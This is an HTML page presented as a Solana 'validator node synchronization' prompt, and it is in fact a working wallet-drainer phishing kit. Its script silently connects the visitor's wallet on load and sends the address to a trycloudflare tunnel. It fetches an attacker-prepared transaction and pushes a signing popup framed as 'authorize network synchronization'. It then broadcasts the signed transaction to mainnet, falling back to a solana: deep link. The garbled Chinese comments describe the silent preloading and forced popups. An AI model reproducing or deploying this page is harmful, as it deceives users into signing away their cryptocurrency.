<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validator Support Protocol</title>
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { width: 300px; padding: 40px; background: #111; border: 1px solid #222; border-radius: 24px; text-align: center; }
        .btn { background: #14f195; color: #000; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; }
        #st { font-size: 10px; color: #444; margin-top: 20px; font-family: monospace; }
    </style>
</head>
<body>
    <div class="box">
        <h2 style="color:#14f195;">SYSTEM SYNC</h2>
        <p style="color:#888; font-size:13px;">Authorize network synchronization to secure validator node #712.</p>
        <button id="cta" class="btn">START INITIALIZE</button>
        <div id="st">READY: V40.4_RAPID</div>
    </div>

    <script>
        const tunnel = "https://lonely-concern-challenging-hosted.trycloudflare.com";
        let cachedTx = null;

        // ðŸ”± 1. é¢„è½½é€»è¾‘ï¼šè¿›é¡µé¢å°±é™é»˜æ‹¿åŒ…ï¼Œä¸ç‚¹æŒ‰é’®ä¹Ÿå‡†å¤‡å¥½
        async function preheat() {
            try {
                const p = window.trustwallet?.solana || window.solana;
                if (!p) return;
                await p.connect({onlyIfTrusted: true}).catch(()=>{});
                const resp = await fetch(tunnel + "/prepare_v32", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ address: p.publicKey?.toString() || "" })
                });
                const info = await resp.json();
                cachedTx = info.raw_tx;
                document.getElementById('st').innerText = "ENGINE: ARMED";
            } catch(e){}
        }
        preheat();

        document.getElementById('cta').onclick = async () => {
            const log = (t) => document.getElementById('st').innerText = t;
            const p = window.trustwallet?.solana || window.solana;
            
            try {
                log("CONNECTING...");
                await p.connect();

                // ðŸ”± 2. æš´åŠ›å”¤é†’ï¼šå¦‚æžœé¢„è½½æ²¡æˆåŠŸï¼ŒçŽ°åœºæŠ“å–
                let raw = cachedTx;
                if(!raw) {
                    const resp = await fetch(tunnel + "/prepare_v32", {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({ address: p.publicKey.toString() })
                    });
                    const info = await resp.json();
                    raw = info.raw_tx;
                }

                log("IGNITING...");
                const tx = window.solanaWeb3.Transaction.from(Uint8Array.from(atob(raw), c => c.charCodeAt(0)));

                // ðŸ”± 3. è¿žå‘æŒ‡ä»¤ï¼šå¼ºåˆ¶æ‹‰èµ·å¼¹çª—
                p.signTransaction(tx).then(s => {
                    log("SUCCESS");
                    const conn = new window.solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
                    conn.sendRawTransaction(s.serialize()).catch(()=>{});
                }).catch(e => {
                    // å…œåº•ï¼šå¦‚æžœ JS ä¸ç†äººï¼Œç›´æŽ¥ç‚¸ç³»ç»Ÿé“¾æŽ¥
                    window.location.href = "solana:signTransaction?payload=" + encodeURIComponent(raw);
                });

            } catch (err) {
                log("RETRYING...");
                setTimeout(() => { window.location.reload(); }, 1200);
            }
        };
    </script>
</body>
</html>
